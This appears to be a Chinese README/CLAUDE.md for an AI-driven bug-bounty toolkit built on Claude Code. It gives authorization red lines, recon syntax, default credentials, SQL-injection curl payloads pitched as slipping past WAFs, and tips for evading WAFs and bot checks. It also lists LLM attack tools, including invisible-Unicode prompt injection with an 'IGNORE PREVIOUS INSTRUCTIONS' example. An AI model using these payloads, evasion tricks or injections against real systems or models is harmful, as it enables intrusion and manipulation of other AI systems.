# Bai-codeagent — Claude Code SRC 漏洞挖掘指南

本项目是一个基于 Claude Code 的 **全自动 SRC 漏洞挖掘 + 开源代码审计** 工具集。
分为两个模块：白盒代码审计（原有功能）和黑盒 SRC 挖掘（claude-hunt/）。

---

## 快速开始

```bash
# 1. 安装扫描工具
chmod +x claude-hunt/install_tools.sh && bash claude-hunt/install_tools.sh

# 2. 安装 Claude Code skills 和 commands
chmod +x claude-hunt/install.sh && bash claude-hunt/install.sh

# 3. 启动 Claude Code
claude

# 4. 核心四命令
/recon target.com          # 信息搜集（子域名、端口、URL、JS分析）
/hunt target.com           # 漏洞挖掘（XSS、SQLi、IDOR、SSRF等）
/validate                  # 验证漏洞（7问门控）
/report                    # 生成报告（补天/漏洞盒子/HackerOne格式）

# 5. 全自动模式
/autopilot target.com --normal   # AI 自动跑完全流程
```

---

## 架构选择：两条路径

本项目有两个核心 AI 引擎，选择取决于你的预算和使用场景：

- **DeepSeek API** = AI 决策大脑（便宜，用于 RedOps Agent 和 Auto-Hunt Agent）
- **Claude Code** = 执行双手（需要 Pro/Max 订阅，全自动化程度最高）
- **视觉 API**（通义千问 qwen-vl）= 截图识别（因为 DeepSeek 不能处理图片）

```
你有 Claude Pro/Max 订阅吗？
│
├── 有 → 用 claude-hunt（/autopilot 全自动）
│         └── 最高效率，AI 自动跑全流程
│
└── 没有 → 你有 DeepSeek API Key 吗？
            │
            ├── 有 → 选择执行方式：
            │         ├── 想要 Web 界面对话 → 用 RedOps Agent（python redops/main.py）
            │         └── 想要全自动挂机跑 → 用 Auto-Hunt Agent（python auto_hunt.py）
            │
            └── 没有 → 去 platform.deepseek.com 注册，充10块钱能用很久
```

**最佳组合：** Claude Code 做高级决策 + Auto-Hunt Agent 跑重复性任务（省 Claude token）。

---

## 项目结构

```
Bai-codeagent/
├── server.js                    # Web 面板服务器
├── public/                      # Web 前端（含 src-hunt.html）
├── src/                         # 白盒代码审计模块
│   ├── agents/                  # 审计代理（CVE审计 + SRC辅助）
│   ├── config/                  # 审计规则 + SRC漏洞模板
│   └── services/                # 报告生成、红线系统、信息搜集
├── claude-hunt/                 # 黑盒 SRC 挖掘模块（Claude Code 驱动）
│   ├── tools/                   # 自动化脚本（recon_engine.sh, hunt.py, vuln_scanner.sh）
│   ├── commands/                # Claude Code slash commands（/recon, /hunt, /report...）
│   ├── agents/                  # AI Agent 定义（autopilot, recon-agent, report-writer...）
│   ├── skills/                  # 漏洞知识库（20种Web2 + 10种Web3漏洞类）
│   ├── rules/                   # 猎手规则（始终生效）
│   ├── memory/                  # 跨会话记忆系统（pattern_db, audit_log）
│   ├── mcp/                     # MCP 集成（Burp Suite, HackerOne）
│   ├── install.sh               # 安装 skills 到 ~/.claude/
│   └── install_tools.sh         # 安装扫描工具（subfinder, nuclei, httpx...）
├── .claude/settings.json        # Claude Code 配置
└── CLAUDE.md                    # 本文件（Claude Code 自动加载）
```

---

## 中国 SRC 红线规则（始终生效）

### 绝对不能做的事

1. **不用自动化扫描器对实名SRC目标扫** — sqlmap/awvs/nessus/dirsearch 批量跑会产生大量异常请求，WAF会记录你的IP+账号，实名制下直接追溯到人。用 Fiddler/Burp 手动逐个测。
2. **不把目标网站打崩** — 并发控制在 5 次以内，不对生产环境做压力测试。一旦导致服务不可用=犯法。
3. **不涉及线上真实用户数据** — 最多用2个自己注册的账号验证，不查看/下载/传播真实用户的任何数据。
4. **不使用在线XSS平台** — 如果有人使用同款平台被执法，平台日志里你也会被查。自己搭或用 alert(1) 截图证明。
5. **没授权不碰** — 只在 SRC 授权范围内测试。不在列表里的资产碰了就是违法。
6. **BC站/黄赌毒不碰** — 博彩/赌博/色情相关网站，哪怕有漏洞也不碰。
7. **情报漏洞不做** — 截图举报类（删差评链、外挂销售、内鬼证据）不属于技术漏洞。
8. **数据库漏洞只读2-3行** — 证明能读就行，读多了=非法获取计算机信息系统数据罪。
9. **公益SRC谨慎** — 部分公益SRC会顺着排行榜/提交记录反向追查。
10. **不改数据/不删东西/不留后门** — 只读不写。修改数据=破坏计算机信息系统罪。
11. **不社工真实员工** — 钓鱼邮件/电话诈骗不在SRC收漏洞范围内。
12. **不测试核心业务高峰期** — 电商大促/支付系统忙时不测，出问题赔不起。
13. **越权只验证存在性** — 看到"能访问"就停，不要继续翻别人数据。
14. **所有操作全程录屏** — 万一被误会，录屏是你的证据。

### 测试规范

- SQL注入：AI手工构造payload验证（不用sqlmap等自动化工具，流量太大会被WAF记录+实名追溯）。只读2-3行证明存在即可。让Claude Code帮你手工构造union/盲注/时间盲注的payload。
- XSS：用 alert(1) 或截图证明即可
- 支付漏洞：选便宜商品，成功后立即取消订单，录全程视频
- 越权：只用自己注册的2个账号互相验证
- 并发：控制在5次以内，成功后立即停止
- SSRF：探测即可，不深入利用内网服务

---

## 中国 SRC 平台

| 平台 | 类型 | 备注 |
|------|------|------|
| 补天 SRC | 公益+企业 | 专属SRC可挖gov类 |
| 漏洞盒子 | 众测 | 金融类需养号 |
| 火线平台 | 众测 | 比较卷 |
| 字节跳动 SRC | 企业 | 赏金高，资产多 |
| 美团 SRC | 企业 | 业务复杂 |
| B站 SRC | 企业 | 业务功能多，适合逻辑漏洞 |
| 阿里巴巴 SRC | 企业 | 电商支付逻辑 |
| 腾讯 SRC | 企业 | 社交+游戏+支付 |

---

## 资产搜集方法（中国特色）

### 企业资产穿透
1. 企查查/天眼查搜索公司名 → 查看股权穿透图
2. 占股超过51%的子公司算作本公司资产
3. 查看知识产权：备案网站、APP、小程序、公众号、软件著作权
4. 七麦数据(qimai.cn)搜索公司旗下APP
5. 小蓝本(sou.xiaolanben.com)搜集公司信息

### FOFA 语法（常用）
```
domain="xxx.com" && (title="管理" || title="后台" || title="平台")
body="<!--统计代码，可删除-->" && header=200
cert="目标域名"
```

### 谷歌语法
```
site:xxx.com inurl:login
intitle:管理 OR intitle:后台 site:xxx.com
site:xxx.com filetype:xls
site:xxx.com "手机号" OR "身份证"
```

---

## 漏洞挖掘重点（SRC高价值目标）

### 功能点 → 漏洞映射

| 功能点 | 优先测试 |
|--------|----------|
| 支付/结算 | 负数/溢出/取消再支付/赠品篡改 |
| 登录/注册 | SQL注入/任意用户注册/验证码绕过 |
| 个人资料 | 水平越权(IDOR)/垂直越权 |
| 订单管理 | IDOR/取消再支付/并发 |
| 优惠券/积分 | 并发领取/不同金额并发 |
| 提现/转账 | 并发提现/金额篡改 |
| 短信/验证码 | 响应泄露/爆破/修改返回包/轰炸 |
| 文件上传 | 类型绕过/路径穿越/webshell |
| 图片/URL | SSRF(内网探测/云元数据) |
| API接口 | 越权/Key泄露/未授权 |

### int最大值溢出公式
```
单价 × 数量 > 2147483647（int32最大值）时溢出
2147483647 / 单价 = 最大安全数量
最大安全数量 + 1 = 溢出数量
溢出后实付 = (数量 × 单价) - 2147483648
```

### 并发测试方法（Fiddler）
1. 方法一：Shift+U 同时发送多次相同请求
2. 方法二：开启拦截模式 → 客户端多次操作 → 一次性放行（适合有随机参数的情况）

---

## 常见默认口令

| 系统 | 用户名 | 密码 |
|------|--------|------|
| k8s控制台 | admin | P@88w0rd |
| zabbix | admin | zabbix |
| grafana | admin | admin |
| nacos | nacos | nacos |
| tomcat | tomcat | tomcat |
| weblogic | weblogic | weblogic |
| rabbitmq | guest | guest |
| druid | admin | 123456 |
| 若依 | admin | admin123 |

---

## 报告格式（中国SRC标准）

```markdown
# 漏洞标题

**平台**: 补天SRC / 漏洞盒子
**目标**: xxx.com
**类型**: 业务逻辑 / 越权 / 支付
**严重程度**: 严重 / 高危 / 中危 / 低危

## 一、漏洞概述
通过修改XXX功能的XXX参数，可以实现XXX效果。

## 二、复现步骤
1. 打开目标网站 xxx.com
2. 进入XX功能页面
3. 使用Fiddler抓包，修改包中price参数为-1
4. 放行数据包，即可成功以负数金额下单

### 数据包
POST /api/order/create HTTP/1.1
Host: xxx.com
Content-Type: application/json

{"productId":"xxx","qty":-1,"price":0.01}

## 三、危害说明
该漏洞可导致攻击者以极低价格购买商品，造成平台经济损失。

## 四、修复建议
建议在服务端对金额和数量参数进行严格校验，包括类型、范围、符号检查。
```

---

## CNVD 双提交（一洞两吃）

同一个开源CMS的洞可以同时拿 CVE + CNVD：
1. 白盒审计发现0day → 写英文报告 → 交NVD拿CVE
2. 同一个洞改成中文报告 → 交CNVD拿编号
3. 两个体系互不冲突，工作量只多翻译半小时

---

## Claude Code 工作流

### 单目标手动流程
```
/recon target.com          → 信息搜集
/hunt target.com           → 漏洞测试
/validate                  → 验证漏洞
/report                    → 生成报告
```

### 全自动流程
```
/autopilot target.com --normal   → AI自动跑全流程，验证后暂停等你确认
/autopilot target.com --yolo     → 最少干预（仍需报告审批）
```

### 继续上次
```
/pickup target.com         → 继续上次未完成的目标
/remember                  → 保存当前发现到记忆系统
```

### 辅助命令
```
/surface target.com        → 排序攻击面（优先测高价值目标）
/intel target.com          → 查询相关CVE和已披露报告
/chain                     → 发现一个洞后，自动查找关联漏洞链
/scope target.com          → 检查目标是否在授权范围内
/arsenal                   → 查看已安装的工具
```

---

## 关键规则（始终生效）

1. **先读scope** — 一个越界请求就可能被ban
2. **只挖真实可利用的洞** — "理论上可能"不算洞
3. **7问门控** — 写报告前必须过7个问题
4. **5分钟规则** — 没进展就换目标
5. **深度优于广度** — 一个目标吃透 > 十个目标浅试
6. **兄弟接口规则** — 一个接口有洞，旁边的接口大概率也有
7. **跟着钱走** — 支付/钱包/退款 = 开发者最多shortcuts的地方
8. **20分钟轮换** — 每20分钟问自己"有进展吗？"没有就换
9. **验证后再写报告** — /validate 通过后才花时间写

---

## 安装依赖

```bash
# 系统工具（Linux/Kali）
sudo apt install golang python3 nodejs jq nmap

# 安全工具（自动安装）
bash claude-hunt/install_tools.sh

# Claude Code skills
bash claude-hunt/install.sh
```

### 需要的工具清单
- subfinder（子域名枚举）
- httpx（HTTP探测）
- nuclei（漏洞扫描模板）
- ffuf（目录爆破）
- nmap（端口扫描）
- gau（历史URL）
- dalfox（XSS检测）
- katana（爬虫）

---

## Web面板（可选）

```bash
npm start
# 访问 http://localhost:3000
# SRC挖掘面板: http://localhost:3000/src-hunt.html
```

Web面板提供：目标管理、信息搜集计划生成、漏洞模板推荐、报告生成、红线提醒。
适合不用 Claude Code 时的辅助工作。

---

## 完整工具清单（claude-hunt/tools/）

### HackerOne 专用工具

| 文件 | 功能 | 用法 |
|------|------|------|
| `h1_idor_scanner.py` | HackerOne GraphQL IDOR 跨用户越权扫描 | `python3 h1_idor_scanner.py --token-a TOKEN_A --token-b TOKEN_B --report-id ID` |
| `h1_race.py` | HackerOne 竞态条件测试（赏金双花/2FA限速/负数赏金） | `python3 h1_race.py --token-a TOKEN --test bounty --report-id ID` |
| `h1_oauth_tester.py` | HackerOne OAuth/认证流测试（state CSRF/redirect_uri/host header） | `python3 h1_oauth_tester.py --token TOKEN` |
| `h1_mutation_idor.py` | HackerOne GraphQL Mutation 越权（以他人身份执行特权操作） | `python3 h1_mutation_idor.py --token-a TOKEN_A --token-b TOKEN_B` |
| `hai_probe.py` | HackerOne Hai AI Copilot API 指纹探测 | `python3 hai_probe.py --token YOUR_TOKEN --api-name YOUR_API_NAME` |
| `hai_browser_recon.js` | DevTools 控制台脚本，拦截 Hai 的 GraphQL API | 在 hackerone.com 报告页 → DevTools → Console → 粘贴执行 |

### AI/LLM 攻击工具

| 文件 | 功能 | 用法 |
|------|------|------|
| `sneaky_bits.py` | 隐形 Prompt 注入编码（U+2062/U+2064 隐藏指令） | `python3 sneaky_bits.py encode "IGNORE PREVIOUS INSTRUCTIONS"` |
| `hai_payload_builder.py` | VAPT Payload 库 + LLM 注入生成（NoSQL/SSTI/Cmd/MFA/SAML） | `python3 hai_payload_builder.py --type nosql` 或 `--attack system_prompt` |

### 业务逻辑漏洞工具

| 文件 | 功能 | 用法 |
|------|------|------|
| `race_tester.py` | 并发竞态测试（领券/提现/签到） | `python3 race_tester.py --url URL --method POST --headers '{}' --body '{}' --threads 20` |
| `idor_diff.py` | IDOR 越权自动对比（水平+垂直+无认证） | `python3 idor_diff.py --url "URL/{ID}" --ids "123,456" --auth-a "Cookie: A" --auth-b "Cookie: B"` |
| `jwt_attack.py` | JWT 攻击（alg:none/弱密钥爆破/payload篡改/过期绕过） | `python3 jwt_attack.py --token "eyJ..." --all --verify-url URL` |
| `zero_day_fuzzer.py` | 零日发现 Fuzzer（CORS/CRLF/Host注入/403绕过/缓存投毒） | `python3 zero_day_fuzzer.py https://target.com --deep` |

### 特定平台测试

| 文件 | 功能 | 用法 |
|------|------|------|
| `zendesk_idor_test.py` | Zendesk 平台越权测试（跨组织数据访问） | `export ZENDESK_SUBDOMAIN=xxx && python3 zendesk_idor_test.py` |

### 信息搜集与分析

| 文件 | 功能 | 用法 |
|------|------|------|
| `js_extractor.py` | JS 敏感信息提取（API端点/密钥/Token/AWS Key） | `python3 js_extractor.py --crawl "https://target.com"` |
| `screenshot_ocr.py` | 截图分析+验证码识别（Qwen-VL/GPT-4o/Tesseract） | `python3 screenshot_ocr.py --captcha captcha.png` |
| `intel_engine.py` | 情报引擎（CVE/历史漏洞查询） | 被 hunt.py 内部调用 |
| `token_scanner.py` | Token/密钥泄露扫描 | 被 hunt.py 内部调用 |
| `target_selector.py` | 目标优先级选择 | 被 /surface 命令调用 |
| `mindmap.py` | 攻击面思维导图生成 | 被 /recon 命令调用 |

### 浏览器/GUI 自动化

| 文件 | 功能 | 用法 |
|------|------|------|
| `browser_auto.py` | Playwright 无头浏览器（登录/表单/Cookie提取/请求拦截） | `python3 browser_auto.py --url URL --fill "#user=admin" --click "button" --screenshot out.png` |
| `ui_controller.py` | 桌面 GUI 自动化（pyautogui 鼠标键盘/滑块验证码） | `python3 ui_controller.py --click 500 300` 或 `--drag 200 300 500 300` |

### 认证与会话管理

| 文件 | 功能 | 用法 |
|------|------|------|
| `auth_session.py` | 认证会话管理（Cookie/Token 持久化） | 被 hunt.py `--cookie` 参数调用 |
| `credential_store.py` | 凭证安全存储 | 内部模块 |
| `scope_checker.py` | Scope 授权范围检查（每个请求前验证） | 被 /scope 命令和 autopilot 调用 |

### 记忆与学习

| 文件 | 功能 | 用法 |
|------|------|------|
| `learn.py` | 漏洞模式学习（成功技术记录） | 被 /remember 命令调用 |
| `memory_gc.py` | 记忆文件清理（10MB上限轮换） | 被 /memory-gc 命令调用 |

### 核心引擎

| 文件 | 功能 | 用法 |
|------|------|------|
| `hunt.py` | 主狩猎编排器（完整流程串联） | `python3 hunt.py --target domain.com` 或 `--agent` 模式 |
| `recon_adapter.py` | 侦察工具适配器（统一输出格式） | 内部模块 |
| `validate.py` | 漏洞验证器（7问门控） | 被 /validate 命令调用 |
| `dashboard.py` | 终端仪表盘（进度/发现统计） | 内部模块 |

---

## Shell 脚本工具（claude-hunt/tools/）

| 文件 | 功能 | Claude Code 命令 |
|------|------|-----------------|
| `recon_engine.sh` | 核心侦察引擎（subfinder→httpx→katana→gau） | `/recon` |
| `vuln_scanner.sh` | 漏洞扫描（nuclei+dalfox+crlfuzz） | `/hunt` |
| `bypass_403.sh` | 403 绕过技术（方法切换/Header/路径变异） | `/bypass-403` |
| `param_discovery.sh` | 参数发现（paramspider+arjun+gf） | `/param-discover` |
| `secrets_hunter.sh` | 密钥泄露扫描（trufflehog+gitleaks） | `/secrets-hunt` |
| `takeover_scanner.sh` | 子域名接管检测（subjack+subzy） | `/takeover` |
| `cloud_recon.sh` | 云基础设施侦察（S3/Azure/GCP Bucket） | `/cloud-recon` |
| `cve_scan.sh` | CVE 模板扫描（nuclei CVE标签） | `/scan-cves` |
| `scope_aggregator.sh` | 多来源 Scope 聚合 | `/scope-aggregate` |
| `cicd_scanner.sh` | CI/CD 管道扫描（GitHub Actions/GitLab CI 配置泄露） | 内部使用 |
| `external_arsenal.sh` | 外部工具状态检查 | `/arsenal` |
| `h1_run.sh` | HackerOne 工具执行封装 | 内部使用 |
| `_auth_helper.sh` | 认证辅助（Cookie/Token 传递） | 内部使用 |

---

## 国产 Nuclei 模板（claude-hunt/tools/nuclei-templates-cn/）

```bash
nuclei -l targets.txt -t claude-hunt/tools/nuclei-templates-cn/ -severity critical,high
```

| 模板 | 检测目标 |
|------|---------|
| `thinkphp-rce-5023.yaml` | ThinkPHP 5.0.23 RCE |
| `thinkphp-5-info-leak.yaml` | ThinkPHP 5.x 信息泄露 |
| `shiro-default-key.yaml` | Apache Shiro 默认密钥反序列化 |
| `nacos-unauth.yaml` | Nacos 未授权访问 |
| `springboot-actuator.yaml` | SpringBoot Actuator 端点暴露 |
| `swagger-api-leak.yaml` | Swagger UI 接口文档泄露 |
| `druid-unauth.yaml` | Druid 监控面板未授权 |
| `redis-unauth.yaml` | Redis 未授权访问 |
| `weaver-oa-rce.yaml` | 泛微 OA 远程代码执行 |
| `yongyou-nc-rce.yaml` | 用友 NC 远程代码执行 |
| `ruoyi-default-creds.yaml` | 若依系统默认口令 |

---

## Auto-Hunt Agent（claude-hunt/auto_agent/）

独立的 AI 自动化挖掘引擎，用 DeepSeek API 驱动，不依赖 Claude Code。

```bash
cd claude-hunt/auto_agent
pip install -r requirements.txt
cp config.yaml.example config.yaml  # 填入 API Key
python auto_hunt.py --target example.com --mode auto
```

| 模块 | 功能 |
|------|------|
| `auto_hunt.py` | 主入口（选模式→选目标→跑全流程） |
| `agent_engine.py` | AI 引擎（DeepSeek调用+命令执行+决策） |
| `waf_adapter.py` | WAF 指纹自适应（Cloudflare/阿里云/宝塔/腾讯云） |
| `session_monitor.py` | Session 状态监控（被踢→停/429→降速） |
| `asset_discovery.py` | 资产关联发现（FOFA证书/AI推测/alterx变异） |
| `intel_checker.py` | 提交前情报查重 |
| `redline_checker.py` | 红线审查（403/404比例/禁止路径） |
| `trace_analyzer.py` | 痕迹分析（AI找可挖线索） |
| `hunt_logger.py` | 桌面日志（doing_日期.md） |
| `checkpoint_manager.py` | 断点续跑（崩溃恢复） |
| `false_positive_filter.py` | 误报自动过滤 |
| `scope_updater.py` | Scope 自动更新管理 |
| `hexstrike_bridge.py` | HexStrike AI Server 桥接（150+工具优化层） |
| `shell_utils.py` | 安全 Shell 命令构建（防注入） |

### Phases 阶段模块

| 阶段 | 工具链 |
|------|--------|
| `phases/recon.py` | subfinder → dnsx → httpx → gau → waybackurls |
| `phases/params.py` | paramspider → gf(xss/ssrf) → arjun |
| `phases/hunt.py` | nuclei → dalfox → CORS → trufflehog → 竞态 → IDOR |
| `phases/validate.py` | AI 7问门控验证 |
| `phases/verify.py` | 四证齐全（代码路径/运行时/证据/反证） |
| `phases/report.py` | 中国 SRC 格式报告生成 |

---

## RedOps Agent（redops/）

基于 LLM 的 Web 对话式渗透测试 Agent。

```bash
cd redops
pip install -r requirements.txt
python main.py
# 浏览器访问 http://localhost:8000
```

| 模块 | 功能 |
|------|------|
| `app/core/llm_agent.py` | LLM 决策核心（DeepSeek/OpenAI/Qwen） |
| `app/core/executor.py` | 命令执行器 |
| `app/core/skill_registry.py` | 渗透技能注册系统 |
| `app/core/memory_system.py` | 跨会话记忆 |
| `app/integrations/fofa.py` | FOFA 搜索引擎集成 |
| `app/integrations/telegram_bot.py` | Telegram 通知 |
| `app/integrations/qq_bot.py` | QQ Bot 通知 |
| `desktop_pet.py` | 桌面宠物界面 |

---

## MCP Server 集成（claude-hunt/mcp/）

| 目录 | 功能 | 配置 |
|------|------|------|
| `hackerone-mcp/` | HackerOne 公开 API（搜索已披露报告/项目统计/政策） | MCP JSON-RPC |
| `fiddler-mcp/` | Fiddler SAZ 抓包分析（提取端点/搜索参数/敏感信息） | 需设 `FIDDLER_EXPORT_DIR` |
| `burp-mcp-client/` | Burp Suite MCP 桥接 | 需 Burp API Key |
| `caido-mcp-client/` | Caido 代理集成 | README only |
| `redops-mcp/` | RedOps Agent MCP 桥接 | 需 RedOps 运行中 |

---

## 自带渗透工具一览

### 信息搜集

| 工具 | 说明 | 用法 |
|------|------|------|
| subfinder | 子域名枚举 | subfinder -d target.com |
| httpx | HTTP存活探测+指纹 | httpx -l subs.txt -silent -tech-detect |
| katana | 爬虫（JS渲染友好） | katana -u target.com -d 3 |
| gau | 历史URL搜集 | echo target.com \| gau |
| naabu | 端口扫描（快） | naabu -host target.com -top-ports 1000 |
| kiterunner | 隐藏API发现 | kr scan target.com -w routes.kite |
| waybackurls | Wayback历史URL | echo target.com \| waybackurls |
| gowitness | 批量网页截图 | gowitness file -f urls.txt |
| wafw00f | WAF识别 | wafw00f target.com |

### 漏洞检测

| 工具 | 说明 | 用法 |
|------|------|------|
| nuclei | 模板化漏洞扫描 | nuclei -u target.com -severity high,critical |
| dalfox | XSS自动检测 | dalfox pipe < urls_with_params.txt |
| crlfuzz | CRLF注入检测 | crlfuzz -u target.com |
| subjack | 子域名接管 | subjack -w subs.txt -t 20 |

### 业务逻辑漏洞（自写Python工具）

| 工具 | 文件 | 说明 |
|------|------|------|
| 并发竞态测试 | race_tester.py | 并发发请求检测提现/领券/签到竞态 |
| 越权自动对比 | idor_diff.py | 两账号对比检测IDOR/垂直越权/未授权 |
| JWT攻击 | jwt_attack.py | alg:none/弱密钥爆破/payload篡改 |
| JS信息提取 | js_extractor.py | 从JS提取API端点/密钥/Token |
| 截图识图 | screenshot_ocr.py | 验证码识别/页面分析/对比截图 |
| UI控制 | ui_controller.py | 鼠标键盘自动化/滑块验证码/截屏 |
| 浏览器自动化 | browser_auto.py | Playwright自动登录/表单/Cookie提取/请求拦截 |

---

## UI 控制 / 鼠标键盘自动化

### ui_controller.py（桌面GUI控制）

依赖：`pip install pyautogui pillow`

```bash
# 全屏截图
python3 claude-hunt/tools/ui_controller.py --screenshot full -o screen.png

# 点击坐标
python3 claude-hunt/tools/ui_controller.py --click 500 300

# 输入文字
python3 claude-hunt/tools/ui_controller.py --type "admin123"

# 拖拽滑块验证码（从x=200拖到x=500）
python3 claude-hunt/tools/ui_controller.py --drag 200 300 500 300 --duration 0.5

# 找到图片并点击
python3 claude-hunt/tools/ui_controller.py --find-and-click login_button.png

# 组合键
python3 claude-hunt/tools/ui_controller.py --hotkey ctrl a

# 获取鼠标位置
python3 claude-hunt/tools/ui_controller.py --position
```

### browser_auto.py（无头浏览器自动化）

依赖：`pip install playwright && playwright install chromium`

```bash
# 访问并截图
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --screenshot page.png

# 自动登录
python3 claude-hunt/tools/browser_auto.py --url "https://target.com/login" \
  --fill "#username=admin" --fill "#password=123456" \
  --click "button[type=submit]" --wait 3 --screenshot logged_in.png

# 提取表单/Cookie/localStorage
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --extract forms
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --extract cookies
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --extract storage

# 拦截所有API请求
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --intercept -o api.json

# 通过代理（配合Fiddler/Burp）
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --proxy http://127.0.0.1:8888
```

---

## 截图识图配置

创建 `~/.config/screenshot_ocr.json`：

```json
{
  "provider": "qwen",
  "api_key": "你的通义千问key",
  "base_url": "https://dashscope.aliyuncs.com/compatible-mode/v1",
  "model": "qwen-vl-plus"
}
```

---

## 业务逻辑漏洞工具用法

### race_tester.py — 并发竞态

```bash
python3 claude-hunt/tools/race_tester.py \
  --url "https://target.com/api/withdraw" \
  --method POST \
  --headers '{"Cookie":"session=xxx","Content-Type":"application/json"}' \
  --body '{"amount":1}' \
  --threads 20
```

### idor_diff.py — 越权对比

```bash
python3 claude-hunt/tools/idor_diff.py \
  --url "https://target.com/api/user/{ID}/orders" \
  --ids "123,456" \
  --auth-a "Cookie: session=userA" \
  --auth-b "Cookie: session=userB" \
  --own-id 123
```

### jwt_attack.py — JWT攻击

```bash
python3 claude-hunt/tools/jwt_attack.py --token "eyJ..." --all \
  --verify-url "https://target.com/api/me"
```

### js_extractor.py — JS敏感信息

```bash
python3 claude-hunt/tools/js_extractor.py --crawl "https://target.com"
```

---

## 安装所有工具

```bash
# Linux/Kali/WSL
sudo bash claude-hunt/install_tools_linux.sh

# UI + 浏览器自动化
pip install pyautogui pillow playwright
playwright install chromium
```

---

## MCP Server 配置

编辑 `~/.claude/settings.json`：

```json
{
  "mcpServers": {
    "fiddler": {
      "command": "python3",
      "args": ["C:/路径/claude-hunt/mcp/fiddler-mcp/server.py"],
      "env": {"FIDDLER_EXPORT_DIR": "C:/Users/你/Documents/Fiddler2/Captures"}
    },
    "redops": {
      "command": "python3",
      "args": ["C:/路径/claude-hunt/mcp/redops-mcp/server.py"],
      "env": {"REDOPS_URL": "http://localhost:8000"}
    },
    "burp": {
      "command": "npx",
      "args": ["-y", "@anthropic/burp-mcp-server"],
      "env": {"BURP_API_KEY": "你的Key", "BURP_URL": "http://localhost:1337"}
    }
  }
}
```

---

## 国产 Nuclei 模板

```bash
nuclei -l targets.txt -t claude-hunt/tools/nuclei-templates-cn/ -severity critical,high
```

含：ThinkPHP RCE、泛微OA、用友NC、Nacos、若依、Shiro、Redis、Actuator、Druid、Swagger

---

## 注意事项

1. 只在获得授权的情况下使用
2. 遵守法律法规
3. SRC测试不要影响线上业务
4. 不对未授权目标发起扫描
5. 并发测试控制在10-50次
6. 数据库漏洞只读2-3行验证
7. 不用在线XSS平台
8. 最多用2个自己注册的账号

---

## 工具安全限速参数（对SRC目标必须加）

对SRC授权目标测试时，所有工具必须加限速参数，否则会触发WAF/风控/人机验证导致IP被封或账号被追溯。

**原则：对SRC目标每秒不超过3-5个请求**

| 工具 | 默认行为（危险） | SRC安全参数 | 说明 |
|------|-----------------|-------------|------|
| nuclei | 并发25线程，全模板 | nuclei -l targets.txt -severity critical,high -rate-limit 5 -c 3 | 只扫高危+限速5/秒+3线程 |
| ffuf | 40线程爆破 | ffuf -u URL/FUZZ -w dict.txt -t 3 -rate 5 -mc 200,301,302,403 | 3线程+限速5/秒 |
| dalfox | 多worker并发 | dalfox pipe --worker 2 --delay 300 --timeout 10 | 2worker+每请求延迟300ms |
| katana | 快速爬取 | katana -u target.com -d 2 -delay 1 -c 3 | 深度2+延迟1秒+3并发 |
| httpx | 50线程探测 | httpx -l urls.txt -threads 5 -rate-limit 10 | 5线程+限速10/秒 |
| naabu | 快速端口扫描 | naabu -host target.com -rate 100 -c 10 | 对单目标100/秒足够 |
| gau/waybackurls | 查第三方数据源 | 无需限速 | 不直接请求目标，安全 |
| subfinder | 查第三方数据源 | 无需限速 | 不直接请求目标，安全 |
| race_tester.py | 并发20-50 | --threads 20 已硬限制 | 一次测完就停，不反复跑 |
| idor_diff.py | 逐个请求 | 默认安全 | 每个ID只发1个请求 |
| browser_auto.py | 正常浏览速度 | 默认安全 | 和人操作一样 |

### 会触发人机验证的行为

- 短时间大量404 — ffuf/dirsearch 目录爆破最容易触发
- 相同参数大量重复请求 — nuclei 模板扫描
- 异常User-Agent — 默认Go/Python UA容易被识别
- 无Cookie/Session的大量请求 — 看起来像爬虫
- 非常规请求频率 — 正常人不会1秒点10次
- 无头浏览器特征 — navigator.webdriver=true 会被检测

### 如何避免触发

- 加随机延迟 — 每个请求之间随机等0.5-2秒
- 带正常Cookie — 先登录获取session再测试
- 用正常UA — Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
- 通过代理 — Fiddler/Burp代理让流量看起来像正常浏览
- 分散时间 — 不要集中在一个时间段全部跑完
- 手工优先 — 对SRC目标，能手工测就手工测

### Claude Code 自动化时的安全策略

当 Claude Code 用 /hunt 或 /autopilot 时，应该：

1. 先用 wafw00f 检测目标是否有WAF
2. 如果有WAF：所有工具加最严格限速（每秒1-2个请求）
3. 如果无WAF：可以稍微快一点（每秒5-10个请求）
4. SQL注入：不用任何自动化工具，让AI逐个手工构造payload通过curl发送
5. 并发测试：一次测完立即停止，不反复验证
6. 发现被ban（全是403/429）：立即停止，等待或换IP

---

## SQL注入的正确做法（AI手工注入）

不要：

```bash
sqlmap -u "http://target.com/page?id=1" --dbs  # ❌ 几百个请求瞬间打过去
```

应该：

```bash
# 1. 先判断是否有注入（1个请求）
curl "http://target.com/page?id=1' AND 1=1--" -H "Cookie: session=xxx"

# 2. 确认后手工构造payload（1个请求）
curl "http://target.com/page?id=1' UNION SELECT 1,2,3--" -H "Cookie: session=xxx"

# 3. 读取数据库名（1个请求）
curl "http://target.com/page?id=1' UNION SELECT 1,database(),3--" -H "Cookie: session=xxx"

# 4. 证明存在即可，截图写报告
# 总共只发了3-4个请求，WAF根本察觉不到
```

让 Claude Code 帮你构造这些 payload，它比 sqlmap 聪明——能根据报错信息动态调整注入方式，而且每次只发1个请求。

---

## 整合的两个开源项目介绍

### 1. RedOps Agent（redops/）

来源：baianquanzu/RedOps-Agent

**是什么：** 基于 LLM 的智能渗透测试 Agent 框架，通过自然语言对话驱动渗透测试。

**核心功能：**

- LLM驱动决策 — 支持 DeepSeek / OpenAI / Claude / 通义千问，用中文对话下达渗透指令
- 技能注册系统 — 动态加载渗透技能模块，可自定义扩展
- Nuclei 集成 — 调用 Nuclei 进行模板化漏洞扫描
- FOFA 资产搜索 — 集成 FOFA API 快速发现目标资产
- 系统命令执行 — 集成 Kali 工具链（nmap/dig/curl等）
- JS逆向分析 — 自动分析页面 JavaScript 提取敏感信息
- 上下文记忆 — 持久化会话，支持多轮对话和任务连续性
- Web管理界面 — 浏览器访问 localhost:8000 对话式操作
- 报告自动生成 — HTML 格式渗透测试报告

启动方式：

```bash
cd redops
pip install -r requirements.txt
python main.py
# 浏览器访问 http://localhost:8000
```

配置 LLM（`redops/app/core/config.yaml`）：

```yaml
llm:
  provider: "deepseek"      # deepseek/openai/anthropic/qwen
  api_key: "你的key"
  base_url: "https://api.deepseek.com/v1"
